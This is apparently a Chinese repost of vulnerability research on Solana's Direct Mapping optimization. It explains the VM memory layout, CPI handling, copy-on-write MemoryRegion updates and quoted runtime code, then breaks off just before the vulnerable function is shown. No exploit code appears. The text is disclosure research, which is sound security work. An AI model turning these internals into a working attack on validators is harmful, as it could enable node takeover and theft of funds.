#  跑？Solana 全链资产要完！ Rust Bug 实现 Validator RCE 和 Money-Printin  
 sec0nd安全   2026-02-23 07:22  
  
   
  
![Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR1Pv5GloMKv9kO2R738Adqsmdn1Ro0Pk1a6wILsrfACF0voqn0D8VBHZfu7m8yty2KANiaXljiaxicIjic4XaQicB6YpBUyYpKXybjc/640?wx_fmt=png&from=appmsg "")  
## The Road to RCE  
  
此文将审视最早在 Solana 1.16 版本中引入的 Direct Mapping 优化。  
  
我们的研究发现了一个由 pointer management 疏漏导致的严重漏洞，最终使我们能够在 validator node 上实现完整的远程代码执行（RCE）。  
  
该功能从未在 mainnet 上启用，但如果这个缺陷当时没有被修补，整个 Solana 网络都可能受到影响，使如今超过 90 亿美元的 total value locked（TVL）面临风险。  
  
我们不仅会讲漏洞细节，也会说明 bug-hunting process。  
  
很多 security researchers 的成果只展示结论，较少公开思考过程。  
  
实际发现严重漏洞通常要经历多次失败，并依赖直觉、好奇心和对系统底层的理解。  
  
本文将从初始线索到最终漏洞，展示真实的 vulnerability research 流程。  
  
如果你只看技术内容，可直接跳到 Setting the Stage: A Primer on Solana's Execution Environment（背景知识）。  
  
若你已熟悉 Solana internals，可直接看 The Vulnerability（漏洞部分）。  
  
否则可以按顺序阅读，跟我们完整走一遍这次分析过程。  
## Very Long Story, Hopefully Short Enough  
  
很多 blockchain 选 Rust、Go 来提升安全性。  
  
Solana 用 Rust，具备较强的 memory safety 和 object lifetime management，但这不等于无漏洞。  
  
在发现 RCE 前，我们已找到多类会影响 liveness 的问题，如 validator 间 non-deterministic execution、feature gating 失配导致升级不同步。  
  
此前多是 business logic bug，这次我们转向更深的 system internals。  
  
我们原本关注 memory address translation（未落地），随后在相邻代码中发现 Direct Mapping。  
  
该优化在 CPI 场景下减少 account data 复制：  
  
把 account data buffers 直接映射到 VM memory，并动态更新 pointers。  
  
问题在于 runtime validation 不充分，最终形成高危 vulnerability。  
  
尽管 exploit 一度被无关 patch 阻断，我们仍绕过限制并完成可用 exploit，接下来进入技术细节。  
## A Primer on Solana's Execution Environment  
  
要分析一个系统的安全性，首先要理解它如何工作。  
  
Solana 对性能做了深度优化，尤其强调 transactions 的 parallel execution，因此必须额外谨慎地避免 race conditions 和 non-determinism 问题，否则可能导致 liveness failures。  
  
由此形成了一种 object oriented design，并结合了 Solana 独特的 data storage 与 transaction models。  
## The Solana Account Model  
  
在 Solana 中，所有内容都存储在称为 Accounts 的结构里。  
  
你可以把 Solana blockchain 的整个状态理解为一个巨大的 key-value store，其中“key”是 Address（即 Pubkey），“value”是 account data 本身。  
  
一个 Account 包含多项信息，最重要的是它会记录一个账户拥有的 native tokens 数量（lamports）、账户的 owner，以及一个 opaque data field。  
```
pub struct Account {    pub lamports: u64,        // Native token balance    pub data: Vec<u8>,        // Variable-length state data    pub owner: Pubkey,        // Program authorized to modify this account    pub executable: bool,     // Whether this account contains executable code    pub rent_epoch: Epoch,    // Rent tracking information}
```  
  
data field 才是关键所在。  
  
对于普通 wallet account，它可能为空；但对于由 program 拥有的 account，这个 byte array 保存了该 program 的全部状态。  
  
该数据结构由各个 program 自行定义。  
  
这个 data field 是本文叙事的核心组件。  
## Transaction and Instruction Flow  
  
为了充分利用以 Account 存储数据的模型，Solana 的 Transaction 会预先声明它要访问哪些 accounts，以及访问方式（read only 或 read + write）。  
  
这使 validators 能检查不同 transactions 是否存在 overlapping storage access，并据此判断是否可以安全地把 transactions 安排为 parallel execution。  
  
Transaction 还可以包含多个 Instructions，每个 Instruction 都是一次 contract call。  
  
这为用户提供了 scripting capability，可在单个 transaction 中完成复杂操作。  
  
一个 Transaction 内的 Instructions 按顺序执行，且具备原子性（atomically）。  
```
pub struct Transaction {    pub signatures: Vec<Signature>,    pub message: Message,}pub struct Message {    pub header: MessageHeader,                    // Access type (read / write) of each accessed account    pub account_keys: Vec<Pubkey>,                // Accounts accessed by the transaction    pub instructions: Vec<CompiledInstruction>,   // Actions performed by the transaction    ...}pub struct MessageHeader {    pub num_required_signatures: u8,    pub num_readonly_signed_accounts: u8,    pub num_readonly_unsigned_accounts: u8,}pub struct Instruction {    pub program_id: Pubkey,              // Program to execute    pub accounts: Vec<AccountMeta>,      // Accounts this instruction will access    pub data: Vec<u8>,                   // Instruction-specific data}    
```  
## The rBPF Virtual Machine  
  
Solana programs 通常使用 Rust 编写，并编译为 eBPF（extended Berkeley Packet Filter）bytecode 的一个变体。  
  
validator 会在 sandboxed virtual machine 中执行这段 bytecode。  
  
对于每笔 transaction，validator 都会为 VM 分配一块专用且隔离的内存空间。  
  
Solana SBF programs 使用的 virtual address memory map 是固定的，布局如下：  
```
0x100000000 - CODE     : Program executable bytecode0x200000000 - STACK    : Call stack (4KB frames)0x300000000 - HEAP     : Dynamic memory (32KB region)0x400000000 - INPUT    : Program input parameters & serialized account data
```  
  
在 VM 内，programs 在执行期间可以按需修改自身内存，而不会影响 host 上存储的内存。所有 validation 都会在 program execution 完成后进行检查。  
## The Legacy Model: Single Program Execution (~v1.14.x)  
  
先看在传统模型下，一次简单的 program execution 是如何流转的。  
  
该流程包含四个主要阶段：从 database 加载 accounts、在 rBPF VM 中执行 bytecode、校验变更以保证 integrity，以及将结果提交到 storage。  
  
单 Program 内存布局  
  
![Single Program Memory Layout](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR1d4jX6Ht2iaice9Df7Uomxg52OKoibApqhIsNDuxZvc2L0fwlma4P7N497aib3pE1xed0LV8e9Ezg1Y3DPo9kCGk9iaSgiaKPFsW7Cg/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，传统模型会把所有 account data 序列化到一段连续的 INPUT region。  
  
该过程如下：  
### Phase 1: Loading and Serializing Accounts  
  
host 与 VM 运行在完全隔离的环境中，二者不能直接共享 objects 或 pointers。  
  
所有 account data 都必须通过 serialization 与 deserialization 跨越这条边界，从而在 trusted host 与 sandboxed VM 之间形成受控接口。  
  
validator 会从 database 加载所有请求的 accounts，并将其序列化为一个 binary blob，随后复制到 0x400000000 的 INPUT region。进入 VM 后，programs 通常会在 bootstrap routine 中先把原始序列化 Accounts 反序列化为 AccountInfo 结构。  
  
AccountInfo 会先存放在 VM 的 heap memory 中，然后再把控制权交给 program entrypoint function：  
```
// How programs reconstruct AccountInfo from the serialized datapub struct AccountInfo<'a> {    pub key: &'a Pubkey,    pub lamports: Rc<RefCell<&'a mut u64>>,    pub data: Rc<RefCell<&'a mut [u8]>>,  // Points directly into INPUT region!    pub owner: &'a Pubkey,    pub rent_epoch: Epoch,    pub is_signer: bool,    pub is_writable: bool,    pub executable: bool,}
```  
  
AccountInfo.data  
 直接指向 INPUT region 内的序列化表示。  
  
比如 program 执行 account.data.borrow_mut()[0] = 42，实际修改的是 VM 内存中的序列化数据。  
  
programs 可以直接与这些序列化字节交互。把序列化 accounts 解析成 AccountInfo 只是 solana program sdk 为了提升开发者体验提供的便利封装。  
### Phase 2: Program Execution  
  
当 accounts 完成序列化并加载到 INPUT region 后，rBPF VM 开始执行 program bytecode。  
  
program 对其 virtual memory space 拥有绝对控制权。  
  
它可以覆盖 account balance、变更 owner、修改 data，甚至破坏整片内存空间。  
  
这种设计选择在执行期间追求最大性能，把安全约束延后到 validation phase。  
### Phase 3: Post-Execution Validation  
  
program 执行结束后，validator 会校验执行期间的每一项变更。  
  
它不会信任执行期间发生的任何事，而是逐项检查修改，确保没有规则被破坏，也没有资金被盗。  
  
在把 account state updates 持久化到 storage 前，validation rules 会保证状态一致性（state consistency）和权限约束（permission enforcement）：  
- • 仅当 account 在 Transaction  
 和 Instruction  
 中都标记为 writable 时，相关字段才可修改。  
  
- • 只有 account owner 可以修改 owner  
 和 data  
。  
  
- • 仅当 data 已清零（data is zeroed）时，owner 才可修改。  
  
- • Lamports 可被任何人增加，但仅 owner 可减少。  
  
- • 整个 transaction 执行前后，Lamports 总量必须保持一致。  
  
### Phase 4: Final Commit  
  
当所有 validation rules 都通过后，修改后的 account states 会被提交回 database。  
  
此时 program 执行期间的全部变更被持久化，transaction 被确认。  
  
若任一校验规则失败，整个 transaction 会被拒绝，且不会存储任何变更。  
  
听起来很简单，对吧？  
## When Programs Need to Talk: Cross-Program Invocation (v1.14.x)  
  
但当 programs 需要相互调用时会发生什么？  
  
比如你的 dex program 需要调用 token program 来转移 tokens。  
  
这正是 Cross-Program Invocation（CPI）发挥作用的场景，也是在这里，single program execution 的优雅简洁开始失效。  
  
难点在于，每个 program 都运行在各自隔离的 VM 中，并拥有独立的 memory space。  
  
当 Program A 调用 Program B 时，它们不能直接共享 pointers 或 objects。  
  
account data 必须在这些隔离环境之间被谨慎 marshaled，同时维持 security and consistency。  
## TransactionContext: Shared Account Cache  
  
这就引出了一个我们此前略过的细节。  
  
由于 Transaction 具有 atomic 特性且可能包含多个 Instruction，系统必须有一种机制，在后续 Instructions 完成前，缓存前面 Instructions 的临时执行结果。  
  
这个缓存很关键，因为如果后续 Instructions 发生 revert，我们不能让前面 Instructions 的执行效果被持久化。  
  
为此，Solana 引入了 TransactionContext 作为状态缓存结构。  
  
TransactionContext 内包含 AccountSharedData 结构，用于在 runtime 把变更提交到 permanent storage 之前暂存账户修改，或在之后执行回滚。  
```
pub struct TransactionContext {    account_keys: Pin<Box<[Pubkey]>>,              // All account addresses in transaction    accounts: Arc<TransactionAccounts>,            // Shared account data cache    instruction_stack: Vec<InstructionContext>,    // CPI call stack    ...}pub struct TransactionAccounts {    accounts: Vec<RefCell<AccountSharedData>>,     // Mutable account data    ...}// Shared account data that persists across CPI boundaries pub struct AccountSharedData {    lamports: u64,    data: Arc<Vec<u8>>,                           // Thread-safe shared data buffer    owner: Pubkey,    ...}
```  
  
处理 CPI 在一定程度上类似处理多个 Instructions，因此同一个 TransactionContext 也可以复用为 programs 之间传递信息的通道。  
  
在 CPI 调用与返回时，需要把调用方侧最新的 account states 暴露给被调用方。  
  
Solana runtime 的做法是：  
  
先校验账户的最新变更并提交到 TransactionContext，再把 TransactionContext 里的 accounts 传给另一个 VM。  
## CPI Call Process  
  
![CPI Call](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR0tg8ukbg4EibNtqw75lng4AHeXOiaohTo4ibEAW3jSUkJdX0ugnfSCjCMnQlzU2zPLvSMCzE1neicg1gaEZBfF0hIUvnIoZbjgLl0/640?wx_fmt=png&from=appmsg "")  
  
前面提到的 TransactionContext 位于 host 侧，作为两个隔离 VM 之间的桥梁。当 Program A 调用 Program B 时，两者分别运行在独立 VM 中并拥有隔离内存空间，但会通过 host-side TransactionContext 共享 account state。  
  
流程如下：  
### Step 1: Instruction Crafting  
  
Program A 会构造一个 CPI instruction，指定被调用方的 program ID 以及相关 accounts 的 metadata。  
  
其中包括每个 account 的地址、该 account 的 owner 是否已对 instruction 签名、以及该 account 是否应为 writable。  
### Step 2: Load Account Data  
  
runtime 会通过解析 Program A 的 VM 内存中的 AccountInfo 结构，创建 CallerAccount 结构。  
  
这些 CallerAccount 持有直接指向 Program A 序列化 account data 的 mutable references，并会在后续 CPI return 阶段用于高效更新调用方状态。  
```
// Resolved view of AccountInfo with direct field accessstruct CallerAccount<'a> {    lamports: &'a mut u64,                  // Direct mutable reference to lamports    owner: &'a mut Pubkey,                  // Direct mutable reference to owner    original_data_len: usize,               // Track size changes for realloc handling    serialized_data: &'a mut [u8],          // Points to serialized data in VM    vm_data_addr: u64,                      // VM address of AccountInfo.data pointer    ref_to_len_in_vm: &'a mut u64,          // VM address of AccountInfo.data length    serialized_len_ptr: *mut u64,    executable: bool,    rent_epoch: u64,}
```  
  
当 Program B 执行结束后，runtime 会利用这些 mutable references 直接更新 Program A 的 VM 内存，而无需额外查找。  
### Step 3: Validation and Cache Update  
  
在把控制权交给 Program B 之前，runtime 会先校验 Program A 到当前为止的所有操作，这与单程序执行中的 validation phase 类似。只有在校验通过后，Program A 的变更才会写入 shared cache。  
  
这样可确保 AccountSharedData 始终保存合法账户状态，从而让调用链中的每个 program 只能看到前序 program 的已校验变更。  
### Step 4: Serialization to Callee VM  
  
Program B 会获得一个全新的 VM 和新的 INPUT region。  
  
shared cache 中的全部 account data 会被序列化并复制到 Program B 的 INPUT region，这与单程序执行的做法一致。  
  
随后 Program B 可正常运行，看到的 AccountInfo 结构与被直接调用时一致。  
## CPI Return Process  
  
![CPI Return](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR3mrTQjEThe3UFibtiaAQicic0RYXhYdF91weJcaFo7xOyV3libaTsSoHk6AxdQF5ovjkgO4Hjf0YMc7S0TmBEbmgbib87nLTlgncUMg/640?wx_fmt=png&from=appmsg "")  
  
当 Program B 执行结束后，runtime 必须先确认 Program B 的所有变更合法，才能把它们合并回 Program A。  
  
流程如下：  
### Step 1: Validation and Cache Update  
  
Program B 的 VM 状态会按单程序执行的同一套规则重新校验。  
  
这可防止 Program B 违反 ownership rules、盗取资金或修改 read-only accounts。  
  
只有通过校验的变更才会写回 shared cache；同样，这确保 AccountSharedData 在后续 call chain 中始终保存合法账户状态。  
### Step 2: Memory Buffer Management  
  
当 Program B 在执行中调用 realloc() 扩展 account storage 时，account data 可能增长。  
  
常见场景包括新增数据字段、扩展 vectors、保存更多状态信息，或为 NFT metadata 等用户数据分配空间。  
  
为高效处理增长，runtime 会在最初把 accounts 序列化到 Program A 的 VM 内存时，预留超出当前数据长度的 padding。  
  
该预留空间可避免执行期间昂贵的 reallocation。  
  
若 Program B 的增长超出预留 padding，transaction 会立即 revert。  
### Step 3: Update Caller and Resume Execution  
  
shared cache 中已校验的账户状态会复制回 Program A 的 VM memory INPUT region。  
  
runtime 会利用带有 mutable references 的 CallerAccount 结构，高效更新 Program A 的序列化账户数据。  
### The Performance Problem  
  
设想一个典型 DeFi swap，包含 4 层嵌套 program 调用，每层处理 10KB account data。在传统模型中，每次 CPI call 都要把这些数据序列化到 callee VM，并在返回时再复制回来。  
  
对这条 4 层调用链而言，就是下行 40KB 序列化、上行 40KB 回传，总计 80KB 内存操作，才完成一笔 transaction。  
  
对一个每秒处理数千笔复杂交易的 high-throughput blockchain 来说，这类开销会成为 performance bottleneck。  
  
validators 花在内存拷贝上的时间，甚至多于真正执行 program logic 的时间。  
  
Solana 需要更好的 runtime。  
## The Optimization That Broke Everything: Direct Mapping (v1.16.0)  
  
在 Solana v1.16.0 中，引入了一项名为 Direct Mapping 的优化，用于解决大体量 account data 反复 serialization / deserialization 带来的性能问题。  
  
Direct Mapping 不再在 VM 的 INPUT region 中创建独立的 account data 副本，而是把 host 侧真实的 account data buffers 直接暴露给 VM，使 programs 能读写与 host 存储 account state 相同的那块内存。  
  
该优化只作用于 account data field，不作用于 account owner、lamport 等其他字段。  
  
其理由是其余字段体积相对较小，应用该优化的 overhead 可能高于性能收益；只有 data field 足够大，值得采用这种优化。  
## MemoryRegion: The Foundation of VM Address Translation  
  
由于我们即将把 host memory 映射到 virtual guest memory space，有必要先说明 Solana 如何管理 guest virtual memory。  
  
VM 与 host 运行在不同的 address spaces 中。  
  
当 VM 内的程序访问 0x400000000 这样的地址时，这个 virtual address 必须被转换为实际的 host memory location。  
  
Solana 通过 MemoryRegion 结构完成这项转换：  
```
pub struct MemoryRegion {    pub host_addr: Cell<u64>,     // start host address    pub vm_addr: u64,             // start virtual address    pub vm_addr_end: u64,         // end virtual address    pub len: u64,                 // Length in bytes    pub vm_gap_shift: u8,         // Address translation parameters    pub is_writable: bool,        // Permission tracking}
```  
  
每个 MemoryRegion 都把一段 VM 的 virtual address 范围映射到 host memory address 范围。  
  
VM 访问内存时，runtime 会先定位对应的 MemoryRegion，再把 virtual address 转换为相应的 host address。  
## Legacy Model: Single MemoryRegion  
  
在传统模型中，所有 account data 都被打包进 INPUT region 里的一个大型 serialized blob，并由单个 MemoryRegion 管理：  
  
VM 地址范围：0x400000000 - 0x400100000  
  
Host 地址：指向序列化 account data buffer  
  
状态：可写（Writable）  
  
这个单一 MemoryRegion 以一个连续缓冲区（contiguous buffer）承载了全部序列化 account data。  
  
![Legacy MemoryRegion](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR2gZJ0z9ibRWDZeFmhZZQob8yARaMNNXuKibQ0iaQV0FriakKM8LbR65rHbmemx1ic7lk4z92l3exXXgZBSgbQDP02gSibyYC0O6c4HY/640?wx_fmt=png&from=appmsg "")  
## Direct Mapping: Multiple MemoryRegions per Account  
  
Direct Mapping 从根本上改变了这套架构。  
  
它不再在 serialized buffer 中创建 account data 的独立副本，而是为每个 account 创建独立的 MemoryRegion，并直接指向 host 的 AccountSharedData buffers。  
  
当 program 访问 account.data  
 时，VM 会通过该 account 对应的 MemoryRegion 完成地址转换，从而直接读写 host 用于保存 account state 的同一块内存，彻底消除复制步骤。  
  
传统 MemoryRegion  
  
![Legacy MemoryRegion](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR3cf2xbY2a6u44VNVLhtO4ckzzTOUUBIbPcicqGkjiaCA5TOL4EGlaJ00QDOE7vhXTMyzlR9taTnp9pgl4IKuicXL8AvTo9duR8ms/640?wx_fmt=png&from=appmsg "")  
  
上图展示了这一架构转变：从“一个承载序列化副本的大 MemoryRegion”，变为“多个直接指向 host account buffers 的 MemoryRegions”。  
## Changes to the MemoryRegion Structure  
  
仅靠这一点，我们就消除了大量冗余拷贝。  
  
听起来好得有点不真实，对吧？ 这项优化有代价。  
  
最明显的是，Direct Mapping 打破了 Solana 之前依赖的基础执行模型。  
  
在传统模型里，program 可以自由修改 VM memory，因为这些修改只作用于本地副本，之后再校验并决定是否提交到 host。采用 Direct Mapping 后，这种方式不再成立，因为每次 VM 写入都会立刻影响 TransactionContext 中 AccountSharedData 记录的真实 account state。  
  
因此，Solana 必须在每次 memory access 时实施即时权限校验（immediate permission validation）。  
  
但需要做哪些检查？仅做读写检查是否足够？答案是不够。  
  
我们先展示 MemoryRegion 结构的变化，再回到这些变化背后的原因。  
```
pub struct MemoryRegion {    pub host_addr: Cell<u64>,     // start host address    pub vm_addr: u64,             // start virtual address    pub vm_addr_end: u64,         // end virtual address    pub len: u64,                 // Length in bytes    pub vm_gap_shift: u8,         // Address translation parameters    pub state: Cell<MemoryState>, // Permission tracking}pub enum MemoryState {    Readable,   // The memory region is readable    Writable,   // The memory region is writable    Cow(u64),   // The memory region is writable but must be copied before writing}
```  
  
现在每个 MemoryRegion 都会跟踪自身权限状态，并在数据写入时执行访问控制（access controls）。  
  
当 program 尝试写 account data 时，runtime 会立刻检查该 region 的 state：要么允许写入、要么触发 copy-on-write、要么直接拒绝访问。  
  
关键变化是新增 state 字段并替代原先简单的 is_writable 布尔值。  
  
这使权限管理更细粒度，尤其是 Cow(u64) 状态，可在需要时触发 copy-on-write。  
## Copy-on-Write (CoW) Strategy  
  
现在开始说明为什么需要额外的 copy-on-write 状态。  
### Avoid Authoritative Data Contamination  
  
除了基本的读写授权，Direct Mapping 还引入了一个更大的问题：  
  
当 transaction revert 时如何回滚改动。  
  
为什么这是个问题？  
  
TransactionContext 里的 AccountSharedData 不已经是缓存了吗？这要追溯到我们之前略过的 TransactionContext 细节。  
  
当 TransactionContext 和 AccountSharedData 初次创建时，  
AccountSharedData.data  
 实际上指向 persistent storage 中的 authoritative account data（注意 AccountSharedData 是 Arc<Vec>）。  
  
在 CPI 或 instruction boundaries 把变更刷入 AccountSharedData 时，如果数据发生修改，就会调用 Arc::make_mut 创建副本，以避免污染 authoritative copy。  
  
这本质上是一个 copy-on-write 机制，用来避免 TransactionContext 预先克隆全部 account data；但其效果受限于“数据仍需序列化进 VM”这一前提。  
  
Direct Mapping 去掉了 serialization，使我们能更充分利用 copy-on-write 的收益；  
  
但同时，也不能再依赖在 CPI 与 instruction boundaries 调用 Arc::make_mut 来保护 authoritative copy。取而代之，copy-on-write 机制必须内联到实时的 memory access verifications 中。  
  
这正是 copy-on-write state 的作用。  
  
通过增加专门状态，Solana 可以区分 account data 的第一次写入与后续写入。第一次写入会看到 MemoryRegion 处于 CoW 状态，于是复制 data buffer 并更新状态；后续写入会看到状态为 Writable，从而知道当前已在专用副本上操作，不再担心污染 authoritative data。  
### Buffer Reallocation Management  
  
自然地，在启用 Direct Mapping 后，我们还需要处理 account data 增长的可能性。  
  
一个朴素做法是：每当需要更多空间时，就对底层 AccountSharedData buffer 执行 resize。但这种方式效率很低，因为每次 resize 都可能触发 data buffer 的 realloc，进而需要复制数据。  
  
频繁复制会抵消 Direct Mapping 优化的核心收益。  
  
Solana 的做法是对重分配后的 buffer size 进行超额预留（over-reserve）。  
  
在第一次数据复制时（即 copy-on-write），AccountSharedData.data 会预留一个足够容纳单笔 transaction 允许的最大 account data 增长的 buffer。  
  
这样就不需要持续地重新分配 buffer。  
  
![Copy on Write](https://mmbiz.qpic.cn/mmbiz_png/VugQCN2riaR2C3DYBUDVOZR6icBicCjY0Wo84E0MbLjljCydP6JEvY0cJwTWyJEPibFbxJjE2ziaROnJ2Jic18Pv1icbsCH4rwW039xtCsdOeNO0fA/640?wx_fmt=png&from=appmsg "")  
  
总结上述思路，在 Direct Mapping 下的 copy-on-write 如上图所示：AccountSharedData 可能存在 data vector clones，而 MemoryRegion 必须相应更新其 Host_Addr。  
  
作为参考，现在写入 virtual memory 的代码如下。  
  
memory access authorization 在内联逻辑中检查；  
  
对于处于 CoW 状态的 buffer，则通过 callback function 更新 MemoryRegion 与 AccountSharedData.data。  
```
pub fn create_vm<'a, 'b>(...) -> Result<EbpfVm<'a, RequisiteVerifier, InvokeContext<'b>>, Box<dyn std::error::Error>> {    let stack_size = stack.len();    let heap_size = heap.len();    let accounts = Arc::clone(invoke_context.transaction_context.accounts());    let memory_mapping = create_memory_mapping(        ...        regions,        // this is the cow_cb        Some(Box::new(move |index_in_transaction| {            // The two calls below can't really fail. If they fail because of a bug,            // whatever is writing will trigger an EbpfError::AccessViolation like            // if the region was readonly, and the transaction will fail gracefully.            let mut account = accounts                .try_borrow_mut(index_in_transaction as IndexOfAccount)                .map_err(|_| ())?;            accounts                .touch(index_in_transaction as IndexOfAccount)                .map_err(|_| ())?;            if account.is_shared() {                // See BorrowedAccount::make_data_mut() as to why we reserve extra                // MAX_PERMITTED_DATA_INCREASE bytes here.                account.reserve(MAX_PERMITTED_DATA_INCREASE);            }            Ok(account.data_as_mut_slice().as_mut_ptr() as u64)        })),    )?;    ...)fn ensure_writable_region(region: &MemoryRegion, cow_cb: &Option<MemoryCowCallback>) -> bool {    match (region.state.get(), cow_cb) {        (MemoryState::Writable, _) => true,        (MemoryState::Cow(cow_id), Some(cb)) => match cb(cow_id) {            Ok(host_addr) => {                region.host_addr.replace(host_addr);                region.state.replace(MemoryState::Writable);                true            }            Err(_) => false,        },        _ => false,    }}impl<'a> UnalignedMemoryMapping<'a> {    ...    pub fn store<T: Pod>(&self, value: T, mut vm_addr: u64, pc: usize) -> ProgramResult {        let mut len = mem::size_of::<T>() as u64;        let cache = unsafe { &mut *self.cache.get() };        let mut src = &value as *const _ as *const u8;        let mut region = match self.find_region(cache, vm_addr) {            Some(region) if ensure_writable_region(region, &self.cow_cb) => {                // fast path                if let ProgramResult::Ok(host_addr) = region.vm_to_host(vm_addr, len) {                    // Safety:                    // vm_to_host() succeeded so we know there's enough space to                    // store `value`                    unsafe { ptr::write_unaligned(host_addr as *mut _, value) };                    return ProgramResult::Ok(host_addr);                }                region            }            _ => {                return generate_access_violation(self.config, AccessType::Store, vm_addr, len, pc)            }        };        // slow path, handle writes that span multiple memory regions        ...    }    ...}
```  
### Commit Process Changes  
  
新的 CoW strategy 也改变了 account data 的 commit 方式，原因是 mapping constraint：  
  
Directly Mapped Data：  
  
原始 data length 对应的那部分数据已经通过 direct mapping 被修改，不需要额外 copy。  
  
Growth Area Data：  
  
当程序通过 realloc() 扩展 account data 时，新数据最初位于 INPUT section 内预留的 reserved buffer 空间。  
  
由于该 reserved buffer 不会被映射到 host memory（我们只能映射当前精确的数据大小），因此需要一次额外的 copy 操作，把增长数据从未映射的 reserved buffer 移动到 host memory 中实际的 account data buffer。  
  
这一 mapping constraint 意味着：  
  
虽然 Direct Mapping 消除了对已有数据的复制，但在数据增长场景下，仍然需要把数据从未映射的预留空间复制出来。  
### Impact on Cross-Program Invocation  
  
对 Cross-Program Invocation 的影响  
  
在数据写入机制说明之后，下一步要理解的是：在新设计下，CPI 如何工作。  
#### CPI Call Process  
  
CPI 调用流程与原始设计整体上仍然非常相似，大部分步骤没有变化：  
1. 1. 获取参与 CPI instruction 的 accounts 元数据  
  
1. 2. 从 TransactionContext 查找对应的 AccountSharedData  
  
1. 3. 将 AccountInfo 中的 guest addresses 转换为 host pointers，以构造 CallerAccount 结构  
  
1. 4. 更新 reserved buffer，并校验 account 变更后写回 AccountSharedData  
  
1. 5. 将 AccountSharedData 序列化到被调用程序（callee program）的 INPUT section  
  
一个小差异是：  
  
在第 4 步校验之前，不再复制整个 account data，而是只复制仍位于 reserved buffer 中的新增增长数据，把它回写到新分配的 direct-mapped buffer；随后再校验其他字段并写回 AccountSharedData。  
  
![New CPI Call](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR2cN0P39ZxgZJNQyCbI0fnnPafvyGYwU5I3mOyocrGrUlTH8JcQ283KslQNPpR20Tyo5mPWGGUOL5VCVvthMIY2MJiaIjdEXQI8/640?wx_fmt=png&from=appmsg "")  
#### CPI Return Process  
  
主要差异出现在从 CPI 调用返回时。  
  
由于我们使用 direct mapping，在 nested calls 期间可能发生 Vector CoW operations，因此需要检查原始 data buffer mapping 是否已发生重定位。  
  
1-1. 将数据从 reserved buffer 复制回 directly mapped data buffer。  
  
1-2. 按与单程序执行相同的规则，校验所有 account 变更。  
1. 2. 检查 data buffer 是否在 CoW operations 期间发生重定位；若发生重定位，更新父级的 MemoryRegion.host_addr 以反映该变化。  
  
1. 3. 确保 account data length 没有超过调用方程序预期的限制。  
  
1. 4. 将合并后的 account 变更写回父程序的 INPUT region。  
  
需要特别说明的是，第 2 步是 Direct Mapping 引入的新动作。  
  
由于 nested calls 期间可能发生 Vector CoW operations，我们必须检测 buffer 重定位并更新 memory mappings，以维持一致性。  
  
![New CPI Return](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR0IaDdicI8Qvzic7HHticC3pfYjCRiagUTjibqpic9h6icnmfqykRDO2kzHqDIUnK0rIa2NMliblF62UDUfRrHYWFcicOSxuibDaiayULMSib8/640?wx_fmt=png&from=appmsg "")  
#### The MemoryRegion Update Mechanism  
  
当 CoW operations 在 CPI execution 期间导致 account data buffer 发生重定位时，父程序的 MemoryRegions 仍然指向旧的 buffer 位置，因此需要更新以反映该变化。  
  
那么这个更新机制具体是怎样的？  
  
MemoryRegion 负责管理 virtual-to-host address mappings，每个 region 覆盖互不重叠的 virtual address range。  
  
当 buffer 被重定位后，我们需要识别出应更新的具体 MemoryRegion，并修改其 host_addr，使其指向新位置。  
  
Solana 使用存储在 CallerAccount 中的 vm_data_addr 字段来定位正确的 MemoryRegion：  
- • 定位目标 Region：  
使用 vm_data_addr 找到映射该 account data 的 MemoryRegion。这个地址应当落在某个 MemoryRegion 的 virtual address range 内。  
  
- • 比较 Buffer 地址：  
检查该 MemoryRegion 当前的 host_addr 是否与 AccountSharedData 中该 account 的实际 data buffer 地址一致。若不一致，说明 CoW operations 期间发生了重定位。  
  
- • 更新映射：  
将 MemoryRegion 的 host_addr 替换为 AccountSharedData 中的新 buffer 地址，确保后续 VM memory accesses 能解析到正确位置。  
  
- • 完成更新：  
host_addr 更新后，父程序在相同 virtual address 上访问内存时，将正确解析到重定位后的 buffer 位置。  
  
![MemoryRegion Update](https://mmbiz.qpic.cn/sz_mmbiz_png/VugQCN2riaR0WQbYdGh3aMddGn6KjL4hujvAMtoDtyG8qXYq6augjCu3ej0JXjdOpLlVaZYYjOicFtAkd88pImSVXztB2ybIJ00gZ85zawMFI/640?wx_fmt=png&from=appmsg "")  
  
该机制依赖一个假设：vm_data_addr 能准确标识需要更新的正确 MemoryRegion。  
  
下面是根据特定 vm_addr 搜索包含该地址 region 的代码：  
```
impl<'a> UnalignedMemoryMapping<'a> {    ...    fn find_region(&self, cache: &mut MappingCache, vm_addr: u64) -> Option<&MemoryRegion> {        if let Some(index) = cache.find(vm_addr) {            ...        } else {            let mut index = 1;            // region_addresses is eytzinger ordered array of MemoryRegions, so we            // do a binary search here             while index <= self.region_addresses.len() {                // Safety:                // we start the search at index=1 and in the loop condition check                // for index <= len, so bound checks can be avoided                index = (index << 1)                    + unsafe { *self.region_addresses.get_unchecked(index - 1) <= vm_addr }                        as usize;            }            index >>= index.trailing_zeros() + 1;            if index == 0 {                return None;            }            // Safety:            // we check for index==0 above, and by construction if we get here index            // must be contained in region            let region = unsafe { self.regions.get_unchecked(index - 1) };            ...            Some(region)        }    }    ...}
```  
## The Vulnerability  
  
那么，MemoryRegion.host_addr 更新是如何实现的？  
  
update_caller_account() 需要检测 account data 是否因 CoW operations 发生重定位，并更新对应的 memory regions。  
```
impl<'a> UnalignedMemoryMapping<'a> {    ...    pub fn region(        &self,        access_type: AccessType,        vm_addr: u64,    ) -> Result<&MemoryRegion, Box<dyn std::error::Error>> {        // Safety:        // &mut references to the mapping cache are only created internally from methods that do not        // invoke each other. UnalignedMemoryMapping is !Sync, so the cache reference below is        // guaranteed to be unique.        let cache = unsafe { &mut *self.cache.get() };        if let Some(region) = self.find_region(cache, vm_addr) {            if (region.vm_addr..region.vm_addr_end).contains(&vm_addr)                && (access_type == AccessType::Load || ensure_writable_region(region, &self.cow_cb))            {                return Ok(region);            }        }        Err(generate_access_violation(self.config, access_type, vm_addr, 0, 0).unwrap_err())    }    ...}// Vulnerable implementation 